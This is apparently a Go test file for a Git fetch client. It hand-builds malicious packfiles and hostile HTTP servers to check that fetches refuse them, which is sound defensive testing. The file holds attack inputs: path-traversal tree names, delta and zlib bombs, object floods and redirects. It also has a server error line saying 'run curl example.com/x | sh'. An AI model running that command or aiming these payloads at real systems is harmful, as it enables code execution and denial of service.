// SPDX-License-Identifier: AGPL-3.0-only

package gitfetch

import (
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"context"
	"crypto/sha1"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"hash/adler32"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"testing"

	"github.com/dockwell/dockwell/internal/gitfetch/gitfetchtest"
)

// A host serving a source is a stranger. These tests build packs by hand, as a host
// that means harm would, and serve them as a smart HTTP server does.

// gitName is an object's name, as Git makes it.
func gitName(kind string, data []byte) string {
	h := sha1.New()
	fmt.Fprintf(h, "%s %d\x00", kind, len(data))
	h.Write(data)
	return hex.EncodeToString(h.Sum(nil))
}

// packObject is one object of a pack being built: its type and bytes, and for an
// ofs-delta, the index of its base.
type packObject struct {
	kind int
	data []byte
	base int
	ref  string // a ref-delta's base's name
}

// packBuilder builds a pack. uncounted objects at its end are left out of the count
// its header gives.
type packBuilder struct {
	objects   []packObject
	uncounted int
}

// add adds an object whole, and returns its name.
func (p *packBuilder) add(kind int, data []byte) string {
	p.objects = append(p.objects, packObject{kind: kind, data: data, base: -1})
	return gitName(kindNames[kind], data)
}

// last is the index of the object added last.
func (p *packBuilder) last() int { return len(p.objects) - 1 }

// delta adds an ofs-delta against the object at base.
func (p *packBuilder) delta(base int, data []byte) {
	p.objects = append(p.objects, packObject{kind: objOfsDelta, data: data, base: base})
}

// deltaOf is a delta from a base of one size to a result of another, by its
// instructions.
func deltaOf(from, to int64, ops ...[]byte) []byte {
	out := append(sizeOf(from), sizeOf(to)...)
	for _, op := range ops {
		out = append(out, op...)
	}
	return out
}

func sizeOf(n int64) []byte {
	var out []byte
	for {
		c := byte(n & 0x7f)
		if n >>= 7; n == 0 {
			return append(out, c)
		}
		out = append(out, c|0x80)
	}
}

// copyOp copies n bytes from offset off of the base.
func copyOp(off, n int64) []byte {
	op := byte(0x80)
	var args []byte
	for i := range 4 {
		if c := byte(off >> (8 * i)); c != 0 {
			op |= 1 << i
			args = append(args, c)
		}
	}
	if n != 0x10000 {
		for i := range 3 {
			if c := byte(n >> (8 * i)); c != 0 {
				op |= 0x10 << i
				args = append(args, c)
			}
		}
	}
	return append([]byte{op}, args...)
}

// insertOp adds what's given, 127 bytes at most.
func insertOp(data []byte) []byte { return append([]byte{byte(len(data))}, data...) }

func (p *packBuilder) bytes() []byte {
	var b bytes.Buffer
	b.WriteString("PACK")
	_ = binary.Write(&b, binary.BigEndian, uint32(2))
	_ = binary.Write(&b, binary.BigEndian, uint32(len(p.objects)-p.uncounted))
	offsets := make([]int64, len(p.objects))
	for i, o := range p.objects {
		offsets[i] = int64(b.Len())
		size := int64(len(o.data))
		c := byte(o.kind<<4) | byte(size&15)
		for size >>= 4; size != 0; size >>= 7 {
			b.WriteByte(c | 0x80)
			c = byte(size & 0x7f)
		}
		b.WriteByte(c)
		if o.kind == objRefDelta {
			raw, _ := hex.DecodeString(o.ref)
			b.Write(raw)
		}
		if o.kind == objOfsDelta {
			back := offsets[i] - offsets[o.base]
			enc := []byte{byte(back & 0x7f)}
			for back >>= 7; back != 0; back >>= 7 {
				back--
				enc = append([]byte{byte(0x80 | back&0x7f)}, enc...)
			}
			b.Write(enc)
		}
		zw := zlib.NewWriter(&b)
		_, _ = zw.Write(o.data)
		_ = zw.Close()
	}
	sum := sha1.Sum(b.Bytes())
	b.Write(sum[:])
	return b.Bytes()
}

// tree is a tree's bytes, of entries as mode, name and object.
func tree(entries ...[3]string) []byte {
	var b bytes.Buffer
	for _, e := range entries {
		raw, _ := hex.DecodeString(e[2])
		fmt.Fprintf(&b, "%s %s\x00", e[0], e[1])
		b.Write(raw)
	}
	return b.Bytes()
}

func commitOf(tree string) []byte {
	return []byte("tree " + tree + "\nauthor A <a@example.com> 1700000000 +0000\ncommitter A <a@example.com> 1700000000 +0000\n\nby hand\n")
}

func pkt(w io.Writer, s string) { fmt.Fprintf(w, "%04x%s", len(s)+4, s) }

// serve serves a pack as a smart HTTP server does, after an advertisement of version
// 2 that fetches shallow, and returns the repository's URL.
func serve(t *testing.T, pack []byte) string {
	t.Helper()
	return gitfetchtest.Serve(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.HasSuffix(r.URL.Path, "/info/refs"):
			pkt(w, "version 2\n")
			pkt(w, "fetch=shallow\n")
			_, _ = io.WriteString(w, "0000")
		case strings.HasSuffix(r.URL.Path, "/git-upload-pack"):
			pkt(w, "packfile\n")
			for rest := pack; len(rest) > 0; {
				n := min(len(rest), 65515)
				fmt.Fprintf(w, "%04x\x01", n+5)
				_, _ = w.Write(rest[:n])
				rest = rest[n:]
			}
			_, _ = io.WriteString(w, "0000")
		default:
			http.NotFound(w, r)
		}
	})) + "/repo"
}

// A tree names each entry, and a name that reaches past its folder, or that Git
// refuses, refuses the whole commit, so no name read from a tree is a path elsewhere
// (the first review of #332, its H1).
func TestATreeNamesNothingOutsideIt(t *testing.T) {
	for _, bad := range []string{
		"../../../../tmp/planted.yaml", "/abs.yaml", "sub/x.yaml", `a\b.yaml`, "..", ".", "", ".git", ".GIT", "dup.yaml",
	} {
		p := &packBuilder{}
		blob := p.add(objBlob, []byte("id: x\n"))
		entries := [][3]string{{"100644", "ok.yaml", blob}, {"100644", bad, blob}}
		if bad == "dup.yaml" {
			entries = append(entries, [3]string{"100644", bad, blob})
		}
		top := p.add(objTree, tree(entries...))
		commit := p.add(objCommit, commitOf(top))
		got, err := Fetch(t.Context(), gitfetchtest.Client(), serve(t, p.bytes()), commit, "", Default)
		if err == nil || !strings.Contains(err.Error(), "which Git refuses") {
			t.Errorf("an entry named %q: %v, %v", bad, keys(got), err)
		}
	}
}

// allocated is how much a function allocates.
func allocated(f func()) uint64 {
	var before, after runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&before)
	f()
	runtime.ReadMemStats(&after)
	return after.TotalAlloc - before.TotalAlloc
}

// Deltas that each make 64 MiB of a 64 KiB base, in a pack of a few KiB, are never
// made: nothing the folder needs is one, and none could be, at over maxObject. The
// fetch reads the one file it names, allocating a few MiB, where it made each
// delta before (the first review of #332, its H2).
func TestADeltaBombIsNeverMade(t *testing.T) {
	p := &packBuilder{}
	ok := p.add(objBlob, []byte("id: ok\n"))
	p.add(objBlob, make([]byte, 64<<10))
	base := p.last()
	for i := range 8 {
		ops := [][]byte{insertOp([]byte(fmt.Sprintf("%08d", i)))}
		for range 1023 {
			ops = append(ops, copyOp(0, 0x10000))
		}
		p.delta(base, deltaOf(64<<10, 8+1023*64<<10, ops...))
	}
	top := p.add(objTree, tree([3]string{"100644", "ok.yaml", ok}))
	commit := p.add(objCommit, commitOf(top))
	pack := p.bytes()
	if len(pack) > 64<<10 {
		t.Fatalf("the pack is %d bytes", len(pack))
	}
	url := serve(t, pack)
	var got map[string][]byte
	var err error
	if n := allocated(func() { got, err = Fetch(t.Context(), gitfetchtest.Client(), url, commit, "", Default) }); n > 32<<20 {
		t.Errorf("reading it allocated %d MiB", n>>20)
	}
	if err != nil || string(got["ok.yaml"]) != "id: ok\n" {
		t.Errorf("Fetch = %v, %v", keys(got), err)
	}
	// A folder that names a bomb's result can't have it.
	named := p.add(objTree, tree([3]string{"100644", "bomb.yaml", strings.Repeat("ab", 20)}))
	commit = p.add(objCommit, commitOf(named))
	if _, err := Fetch(t.Context(), gitfetchtest.Client(), serve(t, p.bytes()), commit, "", Default); err == nil || !strings.Contains(err.Error(), "holds no bomb.yaml") {
		t.Errorf("a folder of a bomb: %v", err)
	}
}

// A chain of 64 deltas of 1 MiB each is made once along its length, not again for
// each delta on it, as it was: about 64 MiB made, not 2 GiB.
func TestAChainIsMadeOnce(t *testing.T) {
	p := &packBuilder{}
	data := make([]byte, 1<<20)
	for i := range data {
		data[i] = byte(i * 7)
	}
	p.add(objBlob, data)
	for i := range 64 {
		ops := [][]byte{insertOp([]byte(fmt.Sprintf("%08d", i)))}
		for off := int64(8); off < 1<<20; off += 0x10000 {
			ops = append(ops, copyOp(off, min(0x10000, 1<<20-off)))
		}
		p.delta(p.last(), deltaOf(1<<20, 1<<20, ops...))
		data = append([]byte(fmt.Sprintf("%08d", i)), data[8:]...)
	}
	last := gitName("blob", data)
	top := p.add(objTree, tree([3]string{"100644", "deep.yaml", last}))
	commit := p.add(objCommit, commitOf(top))
	url := serve(t, p.bytes())
	var got map[string][]byte
	var err error
	if n := allocated(func() {
		got, err = Fetch(t.Context(), gitfetchtest.Client(), url, commit, "", Limits{Pack: 64 << 20, Files: 10, File: 2 << 20})
	}); n > 400<<20 {
		t.Errorf("reading it allocated %d MiB", n>>20)
	}
	if err != nil || !bytes.Equal(got["deep.yaml"], data) {
		t.Errorf("Fetch = %v, %v", keys(got), err)
	}
}

// What a pack's objects inflate to counts against a budget, so a pack of a few KiB
// that inflates to 64 MiB is refused where the limits are 1 MiB.
func TestAPackInflatesWithinItsBudget(t *testing.T) {
	p := &packBuilder{}
	big := p.add(objBlob, make([]byte, 64<<20))
	top := p.add(objTree, tree([3]string{"100644", "big.yaml", big}))
	commit := p.add(objCommit, commitOf(top))
	_, err := Fetch(t.Context(), gitfetchtest.Client(), serve(t, p.bytes()), commit, "", Limits{Pack: 1 << 20, Files: 10, File: 1 << 20})
	if err == nil || !strings.Contains(err.Error(), "make more than a source reads") {
		t.Errorf("a zlib bomb: %v", err)
	}
}

// A pack is read to the count its header gives and no further, and reading stops
// with its context.
func TestAPackIsReadAsItsHeaderSays(t *testing.T) {
	p := &packBuilder{uncounted: 1}
	blob := p.add(objBlob, []byte("id: x\n"))
	top := p.add(objTree, tree([3]string{"100644", "x.yaml", blob}))
	commit := p.add(objCommit, commitOf(top))
	p.add(objBlob, []byte("an object past the count"))
	if _, err := Fetch(t.Context(), gitfetchtest.Client(), serve(t, p.bytes()), commit, "", Default); err == nil || !strings.Contains(err.Error(), "more than its header counts") {
		t.Errorf("an object past the count: %v", err)
	}
	p.objects, p.uncounted = p.objects[:3], 0
	f, err := os.CreateTemp(t.TempDir(), "pack")
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	pack := p.bytes()
	if _, err := f.Write(pack); err != nil {
		t.Fatal(err)
	}
	ctx, cancel := context.WithCancel(t.Context())
	cancel()
	if _, err := indexPack(ctx, f, int64(len(pack)), 1<<20); !errors.Is(err, context.Canceled) {
		t.Errorf("a pack read past its context: %v", err)
	}
}

// A source reads only public addresses: the client it reads with by default refuses
// this server's own, wherever a name leads, follows no redirect, and no error
// repeats what the host said (the first review of #332, its H3).
func TestASourceReadsOnlyWhereItMay(t *testing.T) {
	p := &packBuilder{}
	blob := p.add(objBlob, []byte("id: x\n"))
	top := p.add(objTree, tree([3]string{"100644", "x.yaml", blob}))
	commit := p.add(objCommit, commitOf(top))
	url := serve(t, p.bytes())
	// localhost is a name, which the plan's check lets by, and the connection's refuses.
	port, _, _ := strings.Cut(strings.TrimPrefix(url, "https://catalog.example.com:"), "/")
	if _, err := Fetch(t.Context(), nil, "https://localhost:"+port+"/repo", commit, "", Default); err == nil || !strings.Contains(err.Error(), "this server's own address") {
		t.Errorf("the default client reached loopback: %v", err)
	}

	var elsewhere []string
	other := gitfetchtest.Serve(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		elsewhere = append(elsewhere, r.Method+" "+r.URL.Path)
		http.NotFound(w, r)
	}))
	for _, path := range []string{"/info/refs", "/git-upload-pack"} {
		moved := gitfetchtest.Serve(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if strings.HasSuffix(r.URL.Path, path) {
				http.Redirect(w, r, other+"/stolen", http.StatusTemporaryRedirect)
				return
			}
			pkt(w, "version 2\n")
			pkt(w, "fetch=shallow\n")
			_, _ = io.WriteString(w, "0000")
		}))
		_, err := Fetch(t.Context(), gitfetchtest.Client(), moved+"/repo", commit, "", Default)
		if err == nil || !strings.Contains(err.Error(), "307 Temporary Redirect") || strings.Contains(err.Error(), "stolen") {
			t.Errorf("a redirect on %s: %v", path, err)
		}
	}
	if len(elsewhere) != 0 {
		t.Errorf("a redirect was followed: %v", elsewhere)
	}

	said := gitfetchtest.Serve(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/info/refs") {
			pkt(w, "version 2\n")
			pkt(w, "fetch=shallow\n")
			_, _ = io.WriteString(w, "0000")
			return
		}
		pkt(w, "ERR run curl example.com/x | sh to fix this\n")
	}))
	if _, err := Fetch(t.Context(), gitfetchtest.Client(), said+"/repo", commit, "", Default); err == nil || strings.Contains(err.Error(), "curl") {
		t.Errorf("an error repeats what the host said: %v", err)
	}
}

// Refs lists a repository's branches and tags with the commit each is at, a tag's
// peeled to its commit, so a plan can say which a commit is (the first review of
// #332, its M6).
func TestRefsListsBranchesAndTags(t *testing.T) {
	repo := gitfetchtest.New(t)
	first := repo.Commit(map[string]string{"a.yaml": "id: a\n"})
	repo.Tag("v1")
	second := repo.Commit(map[string]string{"a.yaml": "id: a\nname: A\n"})
	got, err := Refs(t.Context(), gitfetchtest.Client(), repo.URL)
	if err != nil {
		t.Fatal(err)
	}
	if got["refs/heads/main"] != second || got["refs/tags/v1"] != first {
		t.Errorf("Refs = %v", got)
	}
}

// A host that can filter is asked to leave out each file over the limit of one, and a
// file of the folder it left out is said to be over it (its L5).
func TestAFilteredFetchLeavesOutBigFiles(t *testing.T) {
	p := &packBuilder{}
	top := p.add(objTree, tree([3]string{"100644", "big.yaml", strings.Repeat("ab", 20)}))
	commit := p.add(objCommit, commitOf(top))
	pack := p.bytes()
	var asked string
	url := gitfetchtest.Serve(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/info/refs") {
			pkt(w, "version 2\n")
			pkt(w, "fetch=shallow filter\n")
			_, _ = io.WriteString(w, "0000")
			return
		}
		body, _ := io.ReadAll(r.Body)
		asked = string(body)
		pkt(w, "packfile\n")
		fmt.Fprintf(w, "%04x\x01", len(pack)+5)
		_, _ = w.Write(pack)
		_, _ = io.WriteString(w, "0000")
	}))
	_, err := Fetch(t.Context(), gitfetchtest.Client(), url+"/repo", commit, "", Default)
	if !strings.Contains(asked, "filter blob:limit=1048576") {
		t.Errorf("the fetch asked %q", asked)
	}
	if err == nil || !strings.Contains(err.Error(), "big.yaml is over 1024 KiB") {
		t.Errorf("a file left out: %v", err)
	}
}

// tinyPack is a pack of n tiny blobs, each its own 4 bytes, beside a commit whose
// folder holds ok.yaml, built byte by byte, as building millions through zlib's
// writer would take a test too long.
func tinyPack(n int) (pack []byte, commit string) {
	var b bytes.Buffer
	b.WriteString("PACK")
	_ = binary.Write(&b, binary.BigEndian, uint32(2))
	_ = binary.Write(&b, binary.BigEndian, uint32(n+3))
	whole := func(kind int, data []byte) string {
		size := int64(len(data))
		c := byte(kind<<4) | byte(size&15)
		for size >>= 4; size != 0; size >>= 7 {
			b.WriteByte(c | 0x80)
			c = byte(size & 0x7f)
		}
		b.WriteByte(c)
		zw := zlib.NewWriter(&b)
		_, _ = zw.Write(data)
		_ = zw.Close()
		return gitName(kindNames[kind], data)
	}
	ok := whole(objBlob, []byte("id: ok\n"))
	var four [4]byte
	for i := range n {
		binary.BigEndian.PutUint32(four[:], uint32(i))
		// A blob of 4 bytes: its header, then zlib's own, one stored block, and its sum.
		b.WriteByte(byte(objBlob<<4) | 4)
		b.Write([]byte{0x78, 0x01, 0x01, 0x04, 0x00, 0xfb, 0xff})
		b.Write(four[:])
		_ = binary.Write(&b, binary.BigEndian, adler32.Checksum(four[:]))
	}
	top := whole(objTree, tree([3]string{"100644", "ok.yaml", ok}))
	commit = whole(objCommit, commitOf(top))
	sum := sha1.Sum(b.Bytes())
	b.Write(sum[:])
	return b.Bytes(), commit
}

// heldBy is how much of the heap f's result holds once it's returned, after a
// collection, as a peak the index keeps.
func heldBy[T any](f func() T) (T, uint64) {
	var before, after runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&before)
	got := f()
	runtime.GC()
	runtime.ReadMemStats(&after)
	runtime.KeepAlive(got)
	if after.HeapAlloc < before.HeapAlloc {
		return got, 0
	}
	return got, after.HeapAlloc - before.HeapAlloc
}

// A pack of many tiny objects costs the index what each object's entry holds, and
// each object a fixed cost against the budget, so its count is bounded, as its size
// is. Before, 4.19 million 4-byte blobs held 1.15 GiB of heap (the narrow check of
// #332, its H2).
func TestManyTinyObjectsAreBounded(t *testing.T) {
	// The most a pack may hold indexes in a few MiB: 64 bytes an entry, and its name.
	data, commit := tinyPack(maxObjects - 3)
	f, err := os.CreateTemp(t.TempDir(), "pack")
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	if _, err := f.Write(data); err != nil {
		t.Fatal(err)
	}
	type indexed struct {
		p   *pack
		err error
	}
	got, held := heldBy(func() indexed {
		p, err := indexPack(t.Context(), f, int64(len(data)), 4*Default.Pack)
		return indexed{p, err}
	})
	if got.err != nil {
		t.Fatal(got.err)
	}
	if held > 16<<20 {
		t.Errorf("an index of %d objects holds %d MiB", maxObjects, held>>20)
	}
	t.Logf("an index of %d objects, from a %d KiB pack, holds %d KiB", maxObjects, len(data)>>10, held>>10)
	if out, err := files(got.p, commit, "", Default); err != nil || string(out["ok.yaml"]) != "id: ok\n" {
		t.Errorf("files = %v, %v", keys(out), err)
	}

	// One past the most is refused at once, by its header's count.
	over := &packBuilder{uncounted: -maxObjects}
	blob := over.add(objBlob, []byte("id: x\n"))
	top := over.add(objTree, tree([3]string{"100644", "x.yaml", blob}))
	overCommit := over.add(objCommit, commitOf(top))
	if _, err := Fetch(t.Context(), gitfetchtest.Client(), serve(t, over.bytes()), overCommit, "", Default); err == nil || !strings.Contains(err.Error(), "objects, more than the 100000 a source reads") {
		t.Errorf("a count past the most: %v", err)
	}

	// Each object costs against the budget, whatever it holds: 5,000 tiny ones are
	// over the budget of a 1 MiB pack.
	small, smallCommit := tinyPack(5000)
	if _, err := Fetch(t.Context(), gitfetchtest.Client(), serve(t, small), smallCommit, "", Limits{Pack: 1 << 20, Files: 10, File: 1 << 20}); err == nil || !strings.Contains(err.Error(), "make more than a source reads") {
		t.Errorf("5,000 tiny objects against a 4 MiB budget: %v", err)
	}
}

// A pack served gzipped, as netguard's client asks for, is bounded by what it holds,
// not by what crossed the network: a few hundred KiB that hold more objects than a
// source reads are refused before they're indexed.
func TestAGzippedPackIsBoundedByWhatItHolds(t *testing.T) {
	pack, commit := tinyPack(maxObjects)
	var body bytes.Buffer
	pkt(&body, "packfile\n")
	for rest := pack; len(rest) > 0; {
		n := min(len(rest), 65515)
		fmt.Fprintf(&body, "%04x\x01", n+5)
		body.Write(rest[:n])
		rest = rest[n:]
	}
	body.WriteString("0000")
	var gz bytes.Buffer
	zw, _ := gzip.NewWriterLevel(&gz, gzip.BestCompression)
	_, _ = zw.Write(body.Bytes())
	_ = zw.Close()
	url := gitfetchtest.Serve(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, "/info/refs") {
			pkt(w, "version 2\n")
			pkt(w, "fetch=shallow\n")
			_, _ = io.WriteString(w, "0000")
			return
		}
		w.Header().Set("Content-Encoding", "gzip")
		_, _ = w.Write(gz.Bytes())
	}))
	_, err := Fetch(t.Context(), gitfetchtest.Client(), url+"/repo", commit, "", Default)
	if err == nil || !strings.Contains(err.Error(), "more than the 100000 a source reads") {
		t.Errorf("%d KiB gzipped, %d objects: %v", gz.Len()>>10, maxObjects+3, err)
	}
}

// A delta that names its base by name is refused: a fetch asks for ofs-delta and no
// thin pack, so an honest host never sends one, and resolving deltas that name bases
// after them took a pass over the pack for each (the narrow check of #332).
func TestARefDeltaIsRefused(t *testing.T) {
	p := &packBuilder{}
	blob := p.add(objBlob, []byte("id: x\n"))
	p.objects = append(p.objects, packObject{kind: objRefDelta, data: deltaOf(6, 6, copyOp(0, 6)), base: -1, ref: blob})
	top := p.add(objTree, tree([3]string{"100644", "x.yaml", blob}))
	commit := p.add(objCommit, commitOf(top))
	if _, err := Fetch(t.Context(), gitfetchtest.Client(), serve(t, p.bytes()), commit, "", Default); err == nil || !strings.Contains(err.Error(), "a delta that names its base") {
		t.Errorf("a ref-delta: %v", err)
	}
}
